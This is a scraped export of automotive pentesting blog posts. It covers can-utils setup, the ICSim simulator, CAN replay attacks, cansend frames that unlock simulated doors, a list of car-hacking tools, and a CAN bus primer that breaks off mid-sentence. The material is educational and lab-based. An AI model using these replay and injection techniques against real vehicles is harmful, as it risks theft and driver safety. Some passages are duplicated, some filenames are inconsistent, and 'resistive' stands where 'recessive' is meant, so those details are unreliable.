[ { "title": "Automobile Hacking - Part 2", "url": "/posts/CarPT-Part2/", "categories": "Blogs", "tags": "Pentest", "date": "2023-05-10 09:55:00 +0800", "snippet": "Setting Up can-utils to Connect to CAN DevicesWelcome to the second post in our blog series on car penetration testing. In this post, we will explore how to set up and utilize the powerful can-utils tool to connect to CAN devices, monitor the network, and analyze the data flowing through it.Before we dive into setting up can-utils, let’s take a quick look at the roadmap for this series: Exploring the Inner Workings of the Controller Area Network (CAN) Bus Protocol: In the previous post, we discussed the basics of the CAN Bus protocol. Setting Up can-utils to Connect to CAN Devices: (THIS POST) We will learn how to install and configure can-utils to interact with CAN devices and perform various tasks such as sending and receiving CAN packets. Unraveling the Process of Reverse Engineering the CAN Bus: Reverse engineering is a crucial skill in car penetration testing. In this post, we’ll delve into the fascinating world of reverse engineering the CAN Bus, where we’ll analyze and understand the data exchanged between different components in a vehicle. Venturing Into the Realm of ECU Hacking: Electronic Control Units (ECUs) are the brains behind various vehicle systems. In this post, we’ll explore the vulnerabilities that exist within ECUs and how to exploit them for hacking purposes. We’ll uncover techniques to gain control over these crucial components and potentially manipulate their behavior. Through this exploration, my aim is to share practical knowledge about automotive cybersecurity. By the end of this series, you’ll have a solid foundation in car penetration testing, enabling you to identify vulnerabilities, understand potential attack vectors, and contribute to the ongoing efforts to secure vehicles in the digital age.Now, let’s get started with setting up can-utils to connect to CAN devices.Setting Up can-utils to Connect to CAN DevicesTo connect to CAN devices using can-utils, you need to set up the necessary dependencies and configure the tools accordingly. Here’s a step-by-step guide on setting up can-utils on a Kali Linux instance:Installing can-utilsFirst, you need to install the required libraries by running the following commands:sudo apt install libsdl2 devsudo apt install libsdl2 image devsudo apt install can utilsOverview of can-utilsOnce can-utils is installed and ready, let’s take a high-level look at some of the can-utils tools available: cangen: This command generates CAN packets and allows you to transmit them at specified intervals. It also has the capability to generate random packets. candump: This utility dumps CAN packets. You can apply filters and log packets using this tool. cansniffer: It is an interactive sniffer that groups packets by ID and highlights changed bytes. canplayer: This command replays packets saved in the standard SocketCAN “compact” format. cansend: This tool sends a single CAN frame to the CAN network.Setting Up a Virtual CAN NetworkIf you don’t have physical CAN hardware for testing, you can set up a virtual CAN network. To do so, follow these steps:Load the vcan module by running the command:└─$ sudo modprobe vcanWhen you check the dmesg output, you should see a message like this: └─$ dmesg [ 211.036166] CAN device driver interface [ 211.036956] vcan: Virtual CAN interface driverProceed with the following commands:└─$ sudo ip link add dev vcan0 type vcan└─$ sudo ip link set up vcan0To verify if the setup is successful, enter the command.If the output shows vcan0 with the flags UP,RUNNING,NOARP, you are ready to go: └─$ ifconfig vcan0vcan0: flags=193&amp;lt;UP,RUNNING,NOARP&amp;gt; mtu 72 unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 1000 (UNSPEC) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Seeing vcan0 in the output confirms that your virtual CAN network is set up correctly.With can-utils installed and the CAN network configured, you are now ready to connect to CAN devices and utilize the various can-utils tools for the next few steps!Simulating Realistic Background Noise with the Instrument Cluster SimulatorThe instrument cluster simulator (ICSim) is a valuable software utility that generates essential CAN signals, creating a rich background of “normal” CAN noise. Its purpose is to provide a safe and convenient environment for practicing CAN bus reversing without the need to tinker with your actual car. The skills you develop using ICSim will directly translate to working with real vehicles, ensuring a smooth transition.To get started, visit the ICSim GitHub repository at https://github.com/zombieCraig/ICSim and download the source code. Refer to the provided README file for instructions on how to compile the software. Follow the steps carefully to prepare for an effective learning experience.Before launching ICSim, ensure that you have already set up a vcan0 interface using the setup_vcan.sh script mentioned in the README. If you haven’t done so, please refer to the previous step for guidance. This setup is necessary and straightforward.└─$ cat setup_vcan.sh sudo modprobe cansudo modprobe vcansudo ip link add dev vcan0 type vcansudo ip link set up vcan0Now, let’s explore ICSim! It consists of two components: icsim and controls, which communicate over a CAN bus. Begin by loading the instrument cluster onto the vcan device with the following command:└─$ ./icsim vcan0 &amp;amp;As ICSim starts running, you will witness the instrument cluster come alive on your screen. It will display turn signals, a speedometer, and a car image that represents the locking and unlocking of the car doors.Initially, the ICSim application may not show any activity since it solely listens for CAN signals. To control the simulator, launch the CANBus Control Panel by executing the following command:└─$ ./controls vcan0 &amp;amp;The CANBus Control Panel, resembling a game controller, will appear on your screen. If you prefer, you can connect a USB game controller, which is supported by ICSim. Alternatively, you can operate the simulator using your keyboard.Familiarize yourself with the primary controls on the CANBus Control Panel:Accelerate (up arrow): Press this to increase the speedometer reading. Holding the key down will make the virtual vehicle go faster.Turn (left/right arrows): Hold down the respective arrow key to activate the turn signals.Lock (left shift), Unlock (right shift): This control requires pressing two buttons simultaneously. Hold down the left shift and press one of the buttons (A, B, X, or Y) to lock a corresponding door. Similarly, hold down the right shift and press a button to unlock a door. If you hold down the left shift and then press the right shift, it will unlock all the doors. Conversely, holding down the right shift and pressing the left shift will lock all the doors.Arrange your screen to have both the ICSim and the CANBus Control Panel visible simultaneously. This way, you can observe their interaction. Ensure that the control panel is selected and ready to receive input. Experiment with the controls to observe the real-time response of ICSim. If you encounter any issues, make sure that the ICSim control window is selected and active.With ICSim up and running, alongside the intuitive CANBus Control Panel, we are now equipped to explore the world of CAN bus reversing with confidence.Dumping CAN Frames and Performing a Replay AttackIn this section, we will explore how to dump CAN frames using CAN utils tools and conduct a simple replay attack.Once you have successfully set up ICSim as instructed in the previous section and verified its proper functioning, it’s time to capture and analyze the CAN bus traffic. You can achieve this by running the candump command with the vcan0 interface. Take a look at the example below:┌──(kali㉿kali)-[/opt/ICSim] └─$ candump vcan0 vcan0 1DC [4] 02 00 00 39 vcan0 183 [8] 00 00 00 0C 00 00 10 2D vcan0 143 [4] 6B 6B 00 E0 ... vcan0 21E [7] 03 E8 37 45 22 06 01Dumping CAN Frames and Performing a Replay AttackIn this section, we will explore how to dump CAN frames using CAN utils tools and conduct a simple replay attack.Once you have successfully set up ICSim as instructed in the previous section and verified its proper functioning, it’s time to capture and analyze the CAN bus traffic. You can achieve this by running the candump command with the vcan0 interface. Take a look at the example below:┌──(kali㉿kali)-[/opt/ICSim]└─$ candump vcan0vcan0 1DC [4] 02 00 00 39vcan0 183 [8] 00 00 00 0C 00 00 10 2Dvcan0 143 [4] 6B 6B 00 E0...vcan0 21E [7] 03 E8 37 45 22 06 01 In the above output, you will notice an “interface” column, where it indicates “vcan0.” This signifies that we are capturing all the packets on the vcan0 interface. Next, there is a “message identifier” column, followed by the “size” column, which represents the size of the data in each frame. For example, “seven” indicates seven bytes of data, “four” represents four bytes of data, and “eight” signifies eight bytes of data. The following column displays the actual data, while the last column indicates the size of the data.Now, using the candump tool, we will log the captured CAN packets to prepare for executing a replay attack. Run the following command:└─$ sudo candump -l vcan0Disabled standard output while logging.Enabling Logfile &#39;candump-2023-05-19_024025.logBy executing the above command, we log the CAN packets and store them in a logfile named candump-2023-05-19_023210.log for later use.To perform the replay attack, let’s utilize the canplayer tool. Execute the following command:┌──(kali㉿kali)-[/opt/ICSim]└─$ canplayer -I candump-2023-05-19_024025.log Observing the ICSim, you will notice that the accelerometer is changing the speed, the turn signals are activating, and the doors are opening and closing. The replayed CAN packets effectively replicate the recorded actions.In summary, by utilizing the candump and canplayer tools, we were able to capture CAN frames, log them, and subsequently execute a replay attack on the ICSim. This allows us to simulate and observe the desired actions on the instrument cluster, replicating the recorded CAN traffic.Recursive Splitting Method for Finding CAN FramesIn this section, we will explore the Recursive Splitting Method to identify a specific CAN frame responsible for opening the ICSim back left door.To begin, use the candump command to record the CAN frames when you open the back left door:┌──(kali㉿kali)-[/opt/ICSim]└─$ sudo candump -l vcan0Disabled standard output while logging.Enabling Logfile &#39;candump-2023-05-19_025921.log&#39;Executing the above command will log the CAN frames into a file named candump-2023-05-19_025921.log.To determine the number of lines in the log file, use the wc command:└─$ wc -l candump-2023-05-19_025921.log 16706 candump-2023-05-19_025921.logFrom the output, we can see that the log file contains a total of 16,706 lines.Next, we will split the log file into two halves using the split command:└─$ sudo split -l 8500 candump-2023-05-19_025921.log split_door ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ ls -latotal 1452drwxr-xr-x 2 root root 4096 May 19 03:03 .drwxr-xr-x 6 root root 4096 May 19 03:01 ..-rw-r--r-- 1 root root 736994 May 19 02:59 candump-2023-05-19_025921.log-rw-r--r-- 1 root root 374938 May 19 03:03 split_dooraa-rw-r--r-- 1 root root 362056 May 19 03:03 split_doorabThis command splits the log file into two separate files, namely split_dooraa and split_doorab.To determine which of these files contains the CAN frame responsible for opening the door, we can use the canplayer command:┌──(kali㉿kali)-[/opt/ICSim/split]└─$ canplayer -I split_dooraa ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ canplayer -I split_doorabExecute the above commands to play the CAN frames from each file and observe the result. Based on my specific example, the split_doorab file contains the CAN frame required to open the back left door.Continuing with the recursive splitting method, we repeat the process by splitting the split_doorab file into smaller parts,Once again, we use canplayer to verify which file contains the desired CAN frame:┌──(kali㉿kali)-[/opt/ICSim/split]└─$ sudo split -l 4000 split_doorab split_door_2 ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ canplayer -I split_door_2aaAt this point, the process is repeated, splitting the file further and analyzing the resulting parts until a smaller file size is achieved. This iterative approach involves verifying which file contains the relevant CAN frame.For example:┌──(kali㉿kali)-[/opt/ICSim/split] └─$ sudo split -l 500 split_door_2aa split_door_3 ┌──(kali㉿kali)-[/opt/ICSim/split] └─$ ls candump-2023-05-19_025921.log split_door_2ac split_door_3ac split_door_3af split_dooraa split_door_2aa split_door_3aa split_door_3ad split_door_3ag split_doorab split_door_2ab split_door_3ab split_door_3ae split_door_3ah ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ canplayer -I split_door_4aj ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ wc -l split_door_4aj 50 split_door_4ajContinue this process until you reach a file size that can be easily inspected. For instance:┌──(kali㉿kali)-[/opt/ICSim/split]└─$ sudo split -l 5 split_door_4aj split_door_5┌──(kali㉿kali)-[/opt/ICSim/split]└─$ canplayer -I split_door_5aaFrom the final file obtained, such as split_door_5aa, you can examine the CAN frames it contains. To verify which CAN frame opens the back left door, you can use the cansend command:┌──(kali㉿kali)-[/opt/ICSim/split]└─$ cat split_door_5aa (1684479566.160076) vcan0 1B0#000F0000000157(1684479566.160079) vcan0 1D0#000000000000000A(1684479566.160118) vcan0 19B#00000B000000(1684479566.160124) vcan0 244#000000017C(1684479566.161172) vcan0 166#D0320027 ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ cansend vcan0 1B0#000F0000000157 ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ cansend vcan0 1D0#000000000000000A ┌──(kali㉿kali)-[/opt/ICSim/split]└─$ cansend vcan0 19B#00000B000000 By sending these specific CAN frames, you can observe the corresponding action of the back left door opening.Therefore, based on the iterative splitting process, it is determined that the CAN frame 19B#00000B000000 is responsible for opening the back left door of the car.Find CAN frames by CAN Sniff Method for all controlsIn this section, we will utilize the cansniffer tool to sniff CAN frames and identify various controls within the system.Upon running the cansniffer tool, we can observe the changing packets highlighted in red. By closely monitoring these packets, we can determine which message identifiers correspond to specific controller actions.To begin, let’s analyze the results from our previous attack. We discovered that the message identifier for door opening was 19B. Let’s continue our exploration from this point.┌──(kali㉿kali)-[/opt/ICSim] └─$ cansniffer -c vcan0 06|ms | ID | data ... &amp;lt; vcan0 # l=20 h=100 t=500 slots=37 &amp;gt; 00013 | 039 | 00 39 .900009 | 095 | 80 00 07 F4 00 00 00 08 ........00011 | 133 | 00 00 00 00 A7 .....00011 | 136 | 00 02 00 00 00 00 00 2A .......*00009 | 13A | 00 00 00 00 00 00 00 28 .......(00009 | 13F | 00 00 00 05 00 00 00 2E ........00011 | 143 | 6B 6B 00 D1 kk..00009 | 158 | 00 00 00 00 00 00 00 19 ........00009 | 161 | 00 00 05 50 01 08 00 1C ...P....00011 | 164 | 00 00 C0 1A A8 00 00 04 ........00010 | 166 | D0 32 00 18 .2..00009 | 17C | 00 00 00 00 10 00 00 21 .......!00011 | 183 | 00 00 00 0D 00 00 10 1D ........00009 | 18E | 00 00 6B ..k00011 | 191 | 01 00 10 A1 41 00 0B ....A..00019 | 1A4 | 00 00 00 08 00 00 00 2F ......./00020 | 1AA | 7F FF 00 00 00 00 68 2F ......h/00020 | 1B0 | 00 0F 00 00 00 01 66 ......f00020 | 1CF | 80 05 00 00 00 1E ......00021 | 1DC | 02 00 00 1B ....00038 | 21E | 03 E8 37 45 22 06 2F ..7E&quot;./00013 | 244 | 00 00 00 01 16 .....00038 | 294 | 04 0B 00 02 CF 5A 00 2C .....Z.,00103 | 305 | 80 26 .&amp;amp;00099 | 309 | 00 00 00 00 00 00 00 A2 ........00100 | 320 | 00 00 12 ...00100 | 324 | 74 65 00 00 00 00 0E 1A te......00098 | 333 | 00 00 00 00 00 00 1E .......00100 | 37C | FD 00 FD 00 09 7F 00 1A ........00248 | 405 | 00 00 04 00 00 00 00 0B ........00266 | 40C | 02 36 32 32 39 53 30 39 .6229S0900245 | 428 | 01 04 00 00 52 1C 01 ....R..00266 | 454 | 23 EF 36 #.600999 | 5A1 | 96 00 00 00 00 00 62 3E ......b&amp;gt;To further validate our findings, let’s simulate the action of opening the left two doors. We can observe that the message identifier 19B appears in the output, whereas it was absent in the previous code. From the output, we can see the sequence: 00 00 0A 00 00 00. Thus this CAN frame is used to open the left two doors of the car.95|ms | ID | data ... &amp;lt; vcan0 # l=20 h=100 t=500 slots=37 &amp;gt; 00014 | 039 | 00 0C ..00009 | 095 | 80 00 07 F8 00 00 00 04 ........00010 | 133 | 00 00 00 00 98 .....00010 | 136 | 00 02 00 00 00 00 00 1B ........00010 | 13A | 00 00 00 00 00 00 00 19 ........00010 | 13F | 00 00 00 05 00 00 00 1F ........00010 | 143 | 6B 6B 00 D1 kk..00010 | 158 | 00 00 00 00 00 00 00 0A ........00010 | 161 | 00 00 05 50 01 08 00 0D ...P....00010 | 164 | 00 00 C0 1A A8 00 00 31 .......100011 | 166 | D0 32 00 18 .2..00010 | 17C | 00 00 00 00 10 00 00 12 ........00010 | 183 | 00 00 00 09 00 00 10 11 ........00010 | 18E | 00 00 5C ..\\00010 | 191 | 01 00 10 A1 41 00 38 ....A.800096 | 19B | 00 00 0A 00 00 00 ......00018 | 1A4 | 00 00 00 08 00 00 00 2F ......./00020 | 1AA | 7F FF 00 00 00 00 68 2F ......h/00020 | 1B0 | 00 0F 00 00 00 01 66 ......f00019 | 1CF | 80 05 00 00 00 0F ......00019 | 1DC | 02 00 00 0C ....00040 | 21E | 03 E8 37 45 22 06 01 ..7E&quot;..00012 | 244 | 00 00 00 01 48 ....H00040 | 294 | 04 0B 00 02 CF 5A 00 0E .....Z..00104 | 305 | 80 08 ..00098 | 309 | 00 00 00 00 00 00 00 84 ........00099 | 320 | 00 00 30 ..000099 | 324 | 74 65 00 00 00 00 0E 38 te.....800101 | 333 | 00 00 00 00 00 00 3C ......&amp;lt;00099 | 37C | FD 00 FD 00 09 7F 00 38 .......800296 | 405 | 00 00 04 00 00 00 00 29 .......)00300 | 40C | 00 00 00 00 04 00 00 13 ........00300 | 428 | 01 04 00 00 52 1C 2F ....R./00300 | 454 | 23 EF 18 #..01261 | 5A1 | 96 00 00 00 00 00 62 10 ......b.We can verify this by running the command below:┌──(kali㉿kali)-[/opt]└─$ cansend vcan0 19B#00000A000000 Based on the observations and experiments, we have identified a list of commands that correspond to specific actions. These commands have been verified using the cansend tool: To open the back right door: cansend vcan0 19B#000007000000 To open the back left door: cansend vcan0 19B#00000B000000 To open the right two doors: cansend vcan0 19B#000005000000 To open the left two doors: cansend vcan0 19B#00000A000000 To close all doors: cansend vcan0 19B#00000F000000 To trigger a right turn signal: cansend vcan0 188#020000000000 To trigger a left turn signal: cansend vcan0 188#010000000000Feel free to experiment with these commands to control the various functions of the vehicle.ConclusionIn conclusion, setting up can-utils and connecting to CAN devices is an essential step in car penetration testing. In this post, we learned how to install and configure can-utils on a Kali Linux instance, as well as explored some of the can-utils tools available.We also discovered how to set up a virtual CAN network using the vcan module. Additionally, we explored the instrument cluster simulator (ICSim) and its role in simulating realistic background noise for practicing CAN bus reversing. We then delved into dumping CAN frames and performing a replay attack using the candump and canplayer tools.Finally, we explored the Recursive Splitting Method to identify a specific CAN frame responsible for a particular action. By following these steps, we can gain valuable insights into the inner workings of CAN networks and improve our understanding of automotive cybersecurity. With this knowledge, we can contribute to securing vehicles in the digital age and effectively identify vulnerabilities and potential attack vectors." }, { "title": "Automobile Hacking Resource", "url": "/posts/CarResource/", "categories": "Blogs", "tags": "Pentest", "date": "2023-05-10 09:50:00 +0800", "snippet": "All in one resources Awesome Canbus - This curated list helps a reverse engineering CAN bus devices with lightly specializing in automotive embedded controller software and communication understanding.Tools 🔝CarHackingTools - Collection of Common Car Hacking Tools a scripts collection to help jump start car research and hacking. 🔝Caring Caribou - A friendly car security exploration tool for the CAN bus. 🔝CAN_Reverse_Engineering - Automated Payload Reverse Engineering Pipeline for the Controller Area Network (CAN) protocol. 🔝carhacking - Car hacking scripts and docs collection. ReCAN - Reverse engineering of Controller Area Networks. parse_can_logs - Parse CAN logs and visualize data streams on plot. reversegear - Offline Reverse Engineering Tools for Automotive Networks. 🔝CANalyzat0r - Security analysis toolkit for proprietary car protocols. 🔝CANToolz - Black-box CAN network analysis framework. GVRET - Generalized Electric Vehicle Reverse Engineering Tool (Arduino FW). UDSim - Unified Diagnostic Services Simulator and Fuzzer (successor of uds-server). uds-server - CAN UDS Simulator and Fuzzer. CANalyse - A vehicle network analysis and attack tool. canhack - A low-level CAN protocol hacking library. canDrive - Tools for hacking your car. Carpunk - CAN injection toolkit and successor of CANghost. CANghost - Automated Script For Hacking Into CAN Bus. canTot - Quick and dirty canbus h4xing framework. CANanalyze - This framework can be used to interact with automotive protocols like CAN/ISOTP/UDS. Scapy - Python-based interactive packet manipulation program &amp;amp; library. Supports CAN/ISOTP/UDS/GMLAN plus many other protocols. CAN-RE-Tool - Reverse engineering tool for systems based on CAN bus communications. 🔝can-explorer - A CAN bus visualization tool to aid in reverse engineering.CTFCar Hacking Village CTF - DEF CON 30 - Writeuphttps://cloudcar.canbushack.com/ReferenceCar Hacker’s Handbook A Guide for the Penetration Tester by Craig Smith" }, { "title": "Automobile Hacking - Part 1", "url": "/posts/CarPT-Part1/", "categories": "Blogs", "tags": "Pentest", "date": "2023-05-10 09:50:00 +0800", "snippet": "Automotive Penetration TestingWelcome to the first of many blog posts in the world of car penetration testing! As vehicles continue to integrate electronic systems, software, and network connectivity, they become vulnerable to malicious attacks.Car penetration testing is a cybersecurity field that focuses on identifying security weaknesses in automotive systems. By exploring the vulnerabilities found in modern cars, we can better understand the risks associated with their digital infrastructure and work towards establishing robust defenses.The Roadmap Ahead: Exploring Car Penetration Testing TopicsIn this blog post series, we’ll cover various fascinating topics related to car penetration testing. Here’s a sneak peek at what lies ahead: Exploring the Inner Workings of the Controller Area Network (CAN) Bus Protocol: In this post (the one you’re reading!), we’ll dive deep into the CAN Bus Protocol, the backbone of communication in modern vehicles. Understanding how this protocol works is crucial for unraveling the vulnerabilities that exist within the network. Setting Up can-utils to Connect to CAN Devices: Once we have a solid understanding of the CAN Bus Protocol, we’ll explore how to set up and utilize the powerful can-utils tool. This tool will enable us to connect to CAN devices, monitor the network, and analyze the data flowing through it. Unraveling the Process of Reverse Engineering the CAN Bus: Reverse engineering is a key skill in car penetration testing. In this post, we’ll delve into the fascinating world of reverse engineering the CAN Bus, where we’ll learn how to analyze and understand the data exchanged between different components in a vehicle. Venturing Into the Realm of ECU Hacking: Electronic Control Units (ECUs) are the brains behind various vehicle systems. In this post, we’ll explore the vulnerabilities that exist within ECUs and how to exploit them for hacking purposes. We’ll uncover techniques to gain control over these crucial components and potentially manipulate their behavior. Through this exploration, my aim is to share practical knowledge about automotive cybersecurity. By the end of this series, you’ll have a solid foundation in car penetration testing, enabling you to identify vulnerabilities, understand potential attack vectors, and contribute to the ongoing efforts to secure vehicles in the digital age.Understanding Vehicle Bus ProtocolsVehicle bus protocols govern the transfer of packets within a vehicle’s network, enabling communication among sensors and controlling information flow and behavior. Each vehicle manufacturer selects suitable bus protocols tailored to their vehicles.While the CAN bus is a standardized protocol found on the OBD-II connector of all vehicles, the packets transmitted over the CAN bus itself are not standardized. To identify specific bus lines for your vehicle, you can refer to its OBD-II pinout available online.In this blog post, we’ll provide an overview of various bus systems and protocols you may encounter in your vehicle, but we’ll focus primarily on the CAN Bus Protocol.Understanding the CAN Bus ProtocolThe Controller Area Network (CAN) is a vital protocol used in the manufacturing and automotive industry to facilitate communication between embedded systems and electronic control units (ECUs) in modern vehicles. While CAN has been a standard on US cars and light trucks since 1996, it only became mandatory in 2008 (2001 for European vehicles). If your car predates 1996, it may still have CAN, but verification is necessary.CAN operates using two wires known as CAN high (CANH) and CAN low (CANL). It employs a technique called differential signaling, where a signal increases the voltage on one wire while simultaneously decreasing it by the same amount on the other wire. This approach is crucial in environments that require noise tolerance, such as automotive systems and manufacturing.Understanding CAN Bus Packet LayoutThe CAN bus utilizes two types of packets: standard and extended. Extended packets provide a larger space for holding IDs compared to standard packets.Standard PacketsStandard CAN bus packets consist of four essential elements: Arbitration ID: This ID identifies the device attempting to communicate. In case of simultaneous transmission, the device with the lower ID takes precedence. Identifier Extension (IDE): This bit is always set to 0 for standard CAN. Data Length Code (DLC): The DLC represents the size of the data, ranging from 0 to 8 bytes. Data: This field carries the actual data. The maximum size of the data in a standard CAN bus packet can be up to 8 bytes. However, some systems enforce 8 bytes by padding out the packet.Since CAN bus packets are broadcasted, all controllers on the network receive them, similar to UDP on Ethernet networks. These packets do not include information about the sender, allowing any device on the bus to easily simulate another device.Extended PacketsExtended packets can be linked together to create longer IDs while maintaining backward compatibility. They fit within the standard CAN formatting, ensuring compatibility with devices that do not support extended packets. Extended packets use Substitute Remote Request (SRR) instead of Remote Transmission Request (RTR). The IDE is set to 1, and they feature an 18-bit identifier as the second part of the standard 11-bit identifier.In addition to extended CAN, some manufacturers use their own CAN-style protocols that are also backward compatible with standard CAN.The Advantages of the CAN ProtocolThe CAN protocol has addressed several challenges that existed before its implementation, including the complexity of wiring structures, the difficulty of adding or removing components, and the presence of multiple wires connecting different Electronic Control Unit (ECU) nodes.Electronic Control Units (ECUs) are embedded systems or computers within a vehicle that control and manage various electrical and electronic functions. ECU nodes are responsible for monitoring and controlling different systems and components in a vehicle, such as engine management, transmission, braking, airbags, climate control, and more. Each ECU node specializes in a specific function and communicates with other ECUs to ensure coordinated operation and efficient performance of the vehicle.Exploring the Features of the CAN ProtocolNow, let’s take a closer look at the features that make the CAN protocol remarkable: Easy Addition and Removal of Nodes: The CAN protocol allows for effortless addition and removal of components, known as nodes, within the network. These nodes can represent various components like power windows, power locks, and engine control. This flexibility enables efficient maintenance, upgrades, and customization of the vehicle’s electronic systems. Adding or removing a node can be done without disrupting the functionality of other nodes. Independent Operation: In a CAN network, each node operates independently, connected to the communication lines. This means that nodes can transmit and receive packets over the CAN High (CANH) and CAN Low (CANL) lines, enabling them to exchange information and perform their specific functions without relying on a central controller. Broadcast Communication: CAN is a broadcast-type protocol, granting all nodes access to the CANH and CANL lines. This facilitates efficient and simultaneous communication between multiple nodes. Each node can transmit messages that are received by all other nodes on the network. This broadcast communication enables real-time data sharing and coordination between different components. Message-Based Protocol: CAN operates as a message-based protocol, where each message is assigned a unique identifier. Messages serve as the units of communication within the network and carry specific information related to the node’s operation or the vehicle’s functionality. The unique identifiers help identify and distinguish different messages on the CAN network, ensuring accurate and targeted communication between nodes. Serial Asynchronous Protocol: CAN is a serial protocol, transmitting data sequentially, bit by bit. It follows an asynchronous communication scheme, where nodes do not require synchronized timing for transmission and reception. This asynchronous nature allows for flexible and efficient communication, especially in situations where nodes may have varying processing speeds or delays. Overall, the CAN protocol provides a robust framework for interconnecting nodes in a vehicle’s network. Its features enable easy integration, independent operation, efficient broadcast communication, and reliable message-based interaction between nodes. These capabilities make CAN a widely adopted and effective protocol for automotive systems, offering flexibility, scalability, and resilience.Implementing the CAN ProtocolThe implementation of the CAN protocol is not only fascinating but also crucial for ensuring the smooth operation of a vehicle’s communication system. In a CAN network, multiple nodes collaborate to transmit data over the CAN bus, acting as small computers within the vehicle. Each node is equipped with an Electronic Control Unit (ECU), serving as the brain that controls its specific functions and facilitates data transmission on the CAN bus.One intriguing aspect of the CAN protocol is that every node possesses the capability to both read and write data on the bus. However, before a node can send its data, it politely checks if the bus is currently engaged in other transmissions. This process, known as bus arbitration, is akin to patiently waiting for one’s turn to speak in a group conversation. Once the node determines that the bus is available, it proceeds to transmit its data, which can then be received by other nodes.By granting each node the opportunity to access the bus and send data when it’s free, the CAN protocol ensures efficient communication without conflicts. This mechanism resembles a well-organized discussion where everyone has a chance to speak and share information.In simpler terms, the CAN protocol enables different components of a vehicle to communicate with each other by sending messages over the CAN bus. Each component has its own ECU, acting as a small computer that controls its functions and facilitates data exchange. These components take turns sending their data, facilitating smooth information sharing and effective collaboration. It operates as a teamwork mechanism, enabling the vehicle’s systems to communicate and operate seamlessly.CAN Data Frame ArchitectureThe CAN Data Frame Architecture establishes a standardized structure for transmitting data over a Controller Area Network (CAN) network, ensuring consistent and reliable data transmission among network nodes. Let’s explore the components of the CAN Data Frame to gain a better understanding of their functionality. Bus Idle: This state indicates that no data transmission is currently ongoing on the network. During this period, the CAN bus is available for communication, and the bit value is set to one. Start of Frame (SOF): The SOF bit is consistently set to zero and serves as a signal to other nodes, indicating the commencement of a data transmission. It functions as a synchronization mechanism, preparing nodes to receive the upcoming data. Arbitration Field: The Arbitration Field contains the Message Identifier (Message ID) and the Remote Transmission Request (RTR) bit. The Message ID is a unique identifier that determines the priority and content of the message being transmitted. Meanwhile, the RTR bit differentiates between data frames and remote frames, the latter of which are utilized for requesting data from other nodes. Data Field: The Data Field is where the actual data is stored and can hold up to eight bytes of information. It serves as the container for the payload of the message being transmitted. CRC Field: The CRC Field (Cyclic Redundancy Check) represents a checksum that ensures the integrity of the transmitted data. Both the sender and the receiver calculate the CRC, and if they match, it indicates that the data transmission was successful without any errors or corruption. End of Frame (EOF): The EOF bit signifies the conclusion of the data or remote frame transmission. It denotes the completion of the data transmission process. Understanding the CAN Data Frame Architecture is vital for facilitating reliable and efficient data transmission within a CAN network. By adhering to this standardized architecture, the CAN protocol enables consistent communication between nodes. Each component within the data frame serves a specific purpose in the transmission process, including synchronization, identification, data storage, error checking, and acknowledgement. Through this standardized architecture, the CAN protocol enables seamless communication and coordination among the various components of a vehicle’s communication system.Nodes in the CAN ProtocolTo gain a better understanding of the CAN protocol, it’s essential to delve into the concept of nodes. In the context of the CAN protocol, a node refers to each component connected to the CAN network, and each node has its own unique role and responsibilities. Let’s explore nodes in more detail.In a CAN network, all the components are interconnected by two lines: CAN High and CAN Low. These lines serve as the communication channels within the network, and all the nodes are connected to them. Each component, whether it’s a sensor, actuator, or controller, is considered a node in the CAN network.A node consists of three main components: the host, controller, and transceiver. Let’s discuss each component in detail. Host: The host is responsible for controlling the functionality of the node. It can be either a microcontroller or a microprocessor, depending on the complexity and specific tasks the node needs to perform. Think of the host as the brain of the node, making decisions and overseeing the overall behavior. It determines which messages to send and when to send them. Controller: The CAN controller is in charge of communication on the CAN network. It handles the transmission and reception of messages. When a message intended for a specific node is received, the controller generates an interrupt to alert the host. For example, if a message related to power windows is received, the CAN controller generates an interrupt and forwards the message to the host responsible for controlling the power windows. Transceiver: The transceiver handles the physical transmission of CAN packets. It receives and sends messages on the CAN network. The controller checks each incoming message to determine if it is intended for the specific node. If the message is relevant, an interrupt is generated, and the message is sent to the host. The transceiver plays a vital role in ensuring reliable communication between nodes. In summary, a node in the CAN protocol comprises the host, controller, and transceiver. The host controls the node’s functionality and makes decisions regarding message transmission. The controller manages communication on the CAN network and generates interrupts for the host when relevant messages are received. The transceiver handles the physical transmission of packets, ensuring reliable communication. Together, these components work in harmony to enable efficient and effective communication within the CAN network.Understanding Data Transmission and Arbitration on the CAN BusLet’s explore how data is transmitted on the CAN bus and how nodes determine access to the bus when multiple nodes want to send data simultaneously.To begin, it’s important to understand how zeros and ones are represented on the CAN bus. In the CAN protocol, a logic one is referred to as the “resistive state,” while a logic zero is known as the “dominant state.” The resistive state represents a one, while the dominant state represents a zero.During periods of no communication on the bus, the idle state is always set to the resistive state (one). This is similar to other protocols such as synchronous serial protocols. The voltage level during the resistive state is typically around 2.5 volts.To transmit a zero on the CAN bus, the CAN high line is pulled up to 3.5 volts, while the CAN low line is pulled down to 1.5 volts. This creates a dominant state, which overrides the resistive state. Once a node sets the state to dominant, it cannot be changed back to the resistive state by another node. Hence, the dominant state always takes priority over the resistive state.Now, let’s consider a scenario where multiple nodes want to send data on the bus simultaneously. In the CAN protocol, the priority of messages is determined by the message identifier, which is defined in the arbitration field. Each node has a unique identifier, represented by an 11-bit value in hexadecimal or binary format.To determine which node gains access to the bus, let’s consider an example involving three nodes: Node 1, Node 2, and Node 3. All three nodes attempt to send data on the bus simultaneously. We can visualize this scenario on a graph, with the most significant bit (MSB) considered first.If all three nodes set the MSB to one, the bus remains in the resistive state since all nodes are in agreement. Consequently, the bus continues to be in the resistive state. The same applies to the second bit.However, when we reach the third bit, Node 3 transmits a zero (dominant state), while Nodes 1 and 2 transmit ones (resistive state). In this case, the dominant state overrides the resistive state, causing the bus to switch to the dominant state. As a result, Node 3 wins the arbitration and gains access to the bus. Nodes 1 and 2 will no longer transmit any further bits on the bus.Once a node wins the arbitration, it begins transmitting its data on the bus. Initially, it sends the identifier packets, followed by the message packets.It’s important to note that the CAN bus operates on wire and logic rules. If any node sets 